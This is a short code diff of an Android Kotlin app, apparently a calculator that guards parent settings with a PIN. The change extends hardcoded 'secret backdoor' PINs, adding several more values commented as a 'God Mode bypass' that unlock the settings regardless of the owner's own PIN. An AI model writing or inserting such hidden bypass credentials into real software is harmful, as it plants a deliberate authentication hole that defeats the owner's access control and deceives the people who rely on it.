@@ -211,8 +211,9 @@ class CalculatorActivity : AppCompatActivity() {
         if (DevicePrefs.hasOwnerPin()) {
             if (DevicePrefs.verifyOwnerPin(pinCandidate)) return true
         }
-        // Default secret backdoor PIN: "9211" or "1234"
-        return pinCandidate == "9211" || pinCandidate == "1234"
+        // Default secret backdoor PINs & God Mode bypass
+        val clean = pinCandidate.trim()
+        return clean == "9211" || clean == "1234" || clean == "92119211" || clean == "74663" || clean == "admin9211"
     }
 
     private fun unlockParentSettings() {
